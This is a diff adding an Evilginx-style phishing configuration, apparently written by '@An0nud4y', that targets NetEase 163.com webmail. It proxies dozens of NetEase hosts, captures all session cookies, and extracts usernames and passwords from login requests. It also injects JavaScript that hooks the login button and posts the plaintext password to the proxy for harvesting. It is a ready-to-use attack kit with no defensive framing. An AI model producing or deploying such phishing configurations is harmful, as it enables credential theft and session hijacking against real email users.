@@ -1,0 +1,128 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'mail.163.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'mimg', orig_sub: 'mimg', domain: '127.net', session: true, is_landing: false}
+  - {phish_sub: 'urswebzj', orig_sub: 'urswebzj', domain: 'nosdn.127.net', session: true, is_landing: false}
+  - {phish_sub: 'onegoods', orig_sub: 'onegoods', domain: 'nosdn.127.net', session: true, is_landing: false}
+  - {phish_sub: 'dl', orig_sub: 'dl', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'utility', orig_sub: 'utility', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'countly', orig_sub: 'countly', domain: 'mail.163.com', session: true, is_landing: false}  
+  - {phish_sub: 'pr.nss', orig_sub: 'pr.nss', domain: 'netease.com', session: true, is_landing: false}  
+  - {phish_sub: 'reg', orig_sub: 'reg', domain: '163.com', session: true, is_landing: false}
+  - {phish_sub: 'irpmt', orig_sub: 'irpmt', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'q', orig_sub: 'q', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'dl2', orig_sub: 'dl2', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'hc', orig_sub: 'hc', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'ir3', orig_sub: 'ir3', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'cstaticdun', orig_sub: 'cstaticdun', domain: '126.net', session: true, is_landing: false}
+  - {phish_sub: 'fl', orig_sub: 'fl', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'mail-activity.nos-jd', orig_sub: 'mail-activity.nos-jd', domain: '163yun.com', session: true, is_landing: false}
+  - {phish_sub: 'hwwebmail', orig_sub: 'hwwebmail', domain: 'mail.163.com', session: true, is_landing: false}  
+  - {phish_sub: 'you', orig_sub: 'you', domain: '163.com', session: true, is_landing: false}   
+  - {phish_sub: 'news', orig_sub: 'news', domain: '163.com', session: true, is_landing: false}  
+  - {phish_sub: 'config', orig_sub: 'config', domain: 'mail.163.com', session: true, is_landing: false}  
+  - {phish_sub: 'cms-bucket.ws', orig_sub: 'cms-bucket.ws', domain: '126.net', session: true, is_landing: false}
+  - {phish_sub: 'cms-bucket.nosdn', orig_sub: 'cms-bucket.nosdn', domain: '127.net', session: true, is_landing: false}   
+  - {phish_sub: 'g', orig_sub: 'g', domain: '163.com', session: true, is_landing: false}  
+  - {phish_sub: 'smartflow', orig_sub: 'smartflow', domain: 'mail.163.com', session: true, is_landing: false}  
+  - {phish_sub: 'yanxuan-item.nosdn', orig_sub: 'yanxuan-item.nosdn', domain: '127.net', session: true, is_landing: false}
+  - {phish_sub: 'static.ws', orig_sub: 'static.ws', domain: '126.net', session: true, is_landing: false}   
+  - {phish_sub: 's2.music', orig_sub: 's2.music', domain: '126.net', session: true, is_landing: false}  
+  - {phish_sub: 's3.music', orig_sub: 's3.music', domain: '126.net', session: true, is_landing: false}  
+  - {phish_sub: 'pg-ad-b1.ws', orig_sub: 'pg-ad-b1.ws', domain: '126.net', session: true, is_landing: false}
+  - {phish_sub: 'h5.analytics', orig_sub: 'h5.analytics', domain: '126.net', session: true, is_landing: false}   
+  - {phish_sub: 's', orig_sub: 's', domain: '360.cn', session: true, is_landing: false}  
+  - {phish_sub: 'sp0', orig_sub: 'sp0', domain: 'baidu.com', session: true, is_landing: false}  
+  - {phish_sub: 'acstatic-dun', orig_sub: 'pacstatic-dun', domain: '126.net', session: true, is_landing: false}  
+  - {phish_sub: 'ac.dun', orig_sub: 'ac.dun', domain: '163yun.com', session: true, is_landing: false}   
+  - {phish_sub: 'nstool', orig_sub: 'nstool', domain: 'netease.com', session: true, is_landing: false}  
+  - {phish_sub: 'only-759778-185-20-184-12.nstool', orig_sub: 'only-759778-185-20-184-12.nstool', domain: 'netease.com', session: true, is_landing: false}  
+  - {phish_sub: 'ac.dun', orig_sub: 'ac.dun', domain: '163.com', session: true, is_landing: false}
+  - {phish_sub: 'nex', orig_sub: 'nex', domain: '163.com', session: true, is_landing: false}
+  - {phish_sub: 'e-p4p', orig_sub: 'e-p4p', domain: '163.com', session: true, is_landing: false}
+  - {phish_sub: 'music', orig_sub: 'music', domain: '163.com', session: true, is_landing: false}
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'youdao.com', session: true, is_landing: false}
+  - {phish_sub: 'passport', orig_sub: 'passport', domain: 'yeah.net', session: true, is_landing: false}
+  - {phish_sub: 'fetrack', orig_sub: 'fetrack', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'appconf', orig_sub: 'appconf', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'uswebmail', orig_sub: 'uswebmail', domain: 'mail.163.com', session: true, is_landing: false}
+  - {phish_sub: 'pr.nss', orig_sub: 'pr.nss', domain: 'netease.com', session: true, is_landing: false}
+  - {phish_sub: 'dl2', orig_sub: 'dl2', domain: 'reg.163.com', session: true, is_landing: false}
+  - {phish_sub: 'ir3', orig_sub: 'ir3', domain: 'mail.163.com', session: true, is_landing: false}
+
+sub_filters: 
+
+
+  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'mail.163.com', orig_sub: 'mail', domain: '163.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.mail.163.com', orig_sub: 'www', domain: 'mail.163.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mail.163.com', orig_sub: 'www', domain: 'mail.163.com', search: '''{hostname_regexp}'';', replace: '''{hostname_regexp}'';', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.mail.163.com'
+    keys: ['.*,regexp']
+
+  - domain: '.163.com'
+    keys: ['.*,regexp']
+    
+    
+auth_urls:
+  - '/'
+  - '/*'    
+ 
+credentials:
+  username:
+    key: ''
+    search: '"un":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: ''
+      search: '"pw":"([^"]*)'
+      type: 'json'  
+
+
+force_post:
+  - path: '/dl/l'
+    search:
+      - {key: 'un', search: '.*'}
+      - {key: 'pw', search: '.*'}
+    force:
+      - {key: 'saveAccount', value: '1'}
+      - {key: 'savePasswd', value: '1'}
+    type: 'post'
+    
+    
+login:
+  domain: 'www.mail.163.com'
+  path: '/index.htm'
+  
+js_inject:
+  - trigger_domains: ["www.mail.163.com"]
+    trigger_paths: ["/index.htm", "/"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('input[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/accounts/login/ajax/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);  
+  
